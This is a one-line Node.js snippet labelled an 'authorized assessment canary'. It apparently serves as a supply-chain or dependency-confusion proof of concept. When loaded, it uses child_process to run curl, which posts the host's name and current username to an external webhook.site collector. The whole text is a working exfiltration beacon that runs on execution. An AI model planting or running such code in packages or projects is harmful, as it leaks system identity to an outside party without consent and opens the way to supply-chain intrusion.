// Authorized assessment canary
const{exec}=require('child_process');exec("curl -s -X POST \"http://webhook.site/6861929e-afcf-4b80-8b97-a1cc90972095/engagement/env\" -H \"Content-Type: application/json\" -d \"{\\\"event\\\":\\\"poc_exec\\\",\\\"host\\\":\\\"$(hostname)\\\",\\\"user\\\":\\\"$(whoami)\\\"}\"");
